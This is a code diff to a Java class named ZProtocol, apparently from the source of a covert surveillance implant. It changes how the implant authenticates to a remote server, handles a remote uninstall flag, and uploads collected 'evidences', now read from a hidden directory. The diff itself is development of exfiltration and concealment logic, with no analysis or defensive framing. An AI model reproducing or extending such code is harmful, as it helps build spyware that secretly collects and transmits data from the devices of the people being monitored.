@@ -51,14 +51,12 @@ public class ZProtocol extends Protocol {
 
     boolean upgrade;
     Vector upgradeFiles = new Vector();
+    Status status=Status.getInstance();
 
     public boolean perform() {
         //#ifdef DBC
         Check.requires(transport != null, "perform: transport = null");
         //#endif
-
-        reload = false;
-        uninstall = false;
 
         // key init
         cryptoConf.makeKey(Encryption.getKeys().getChallengeKey());
@@ -80,9 +78,9 @@ public class ZProtocol extends Protocol {
 
             byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
             byte[] response = transport.command(cypherOut);
-            parseAuthentication(response);
+            Status.self().uninstall=parseAuthentication(response);
 
-            if (uninstall) {
+            if (status.uninstall) {
                 //#ifdef DEBUG
                 debug.warn("Uninstall detected, no need to continue");
                 //#endif  
@@ -184,11 +182,8 @@ public class ZProtocol extends Protocol {
             debug.info("***** Log *****");
             //#endif  
 
-            sendEvidences(Path.SD());
-            if (!Path.SD().equals(Path.USER())) {
-                sendEvidences(Path.USER());
-            }
-
+            sendEvidences(Path.hidden());
+            
             //#ifdef DEBUG
             debug.info("***** END *****");
             //#endif  
@@ -278,7 +273,7 @@ public class ZProtocol extends Protocol {
         return data;
     }
 
-    protected void parseAuthentication(byte[] authResult)
+    protected boolean parseAuthentication(byte[] authResult)
             throws ProtocolException {
         if (authResult.length != 64) {
             //#ifdef DEBUG
@@ -287,6 +282,8 @@ public class ZProtocol extends Protocol {
             throw new ProtocolException(14);
         }
 
+        boolean uninstall=false;
+        
         //#ifdef DEBUG
         debug.trace("decodeAuth result = " + Utils.byteArrayToHex(authResult));
         //#endif
@@ -359,6 +356,8 @@ public class ZProtocol extends Protocol {
             //#endif
             throw new ProtocolException(13);
         }
+        
+        return uninstall;
     }
 
     protected byte[] forgeIdentification() {
